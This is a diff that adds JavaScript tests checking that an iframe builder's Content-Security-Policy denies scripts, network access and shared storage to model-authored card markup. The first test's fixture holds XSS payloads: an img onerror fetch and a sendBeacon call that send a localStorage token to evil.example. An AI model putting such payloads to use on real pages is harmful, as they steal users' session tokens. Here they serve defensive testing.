@@ -67,6 +67,58 @@ describe('beautifier iframe document', () => {
     expect(document).toContain('<script>fetch("https://example.com")</script>');
   });
 
+  it('denies model-authored markup any script, network, or shared-storage surface', () => {
+    const document = buildBeautifierFrameDocument({
+      markup:
+        '<div class="st-card st-item_info" style="color:#fff">' +
+        '<img src="x" onerror="fetch(\'https://evil.example/?d=\'+localStorage.token)">' +
+        '<script>navigator.sendBeacon("https://evil.example", "leak")</script></div>',
+      bridgeId: 'bridge-model-card',
+      scripts: 'block',
+      scriptNonce: 'nonce-under-test',
+      // 就算调用方传了整份命名空间，模型帧也不许把它内嵌进 srcdoc。
+      storageEntries: [['workshop-secret', 'do-not-embed']],
+    });
+
+    const policy = document.match(/Content-Security-Policy" content="([^"]+)/)?.[1] ?? '';
+    // 拦截靠**浏览器**执行 CSP，不靠正则消毒 —— 所以 markup 本身必须原样保留。
+    expect(document).toContain('onerror="fetch(');
+    expect(document).toContain('<script>navigator.sendBeacon(');
+    expect(document).toContain('style="color:#fff"');
+
+    expect(policy).toContain("script-src 'nonce-nonce-under-test'");
+    expect(policy).toContain("script-src-attr 'none'");
+    expect(policy).toContain("connect-src 'none'");
+    expect(policy).toContain("default-src 'none'");
+    expect(policy).not.toContain('unsafe-eval');
+    expect(policy).not.toContain("script-src 'unsafe-inline'");
+    // 卡片自己的样式/图片/字体照旧，视觉不降级。
+    expect(policy).toContain("style-src http: https: data: blob: 'unsafe-inline'");
+    expect(policy).toContain('img-src http: https: data: blob:');
+
+    // 宿主引导脚本带 nonce，才是唯一被放行的那一个。
+    expect(document).toContain('<script nonce="nonce-under-test">');
+    expect(document).not.toContain('do-not-embed');
+    // 共享命名空间既不注入初值，也不挂 window.regexStorage 别名。
+    expect(document).toContain('const __beautifierSharedStorage = false;');
+  });
+
+  it('keeps rule-authored frames on the shared, scriptable contract', () => {
+    const document = buildBeautifierFrameDocument({
+      markup: '<div>rule card</div>',
+      bridgeId: 'bridge-rule-card',
+      storageEntries: [['shared-key', 'shared-value']],
+    });
+
+    const policy = document.match(/Content-Security-Policy" content="([^"]+)/)?.[1] ?? '';
+    expect(policy).toContain("script-src http: https: data: blob: 'unsafe-inline' 'unsafe-eval'");
+    expect(policy).toContain('connect-src http: https: ws: wss: data: blob:');
+    expect(document).toContain('shared-value');
+    expect(document).toContain('const __beautifierSharedStorage = true;');
+    // 规则帧不用 nonce，宿主脚本靠 'unsafe-inline' 放行。
+    expect(document).not.toContain('<script nonce=');
+  });
+
   it('accepts only bridge messages for the current frame', () => {
     expect(
       isBeautifierFrameMessage(
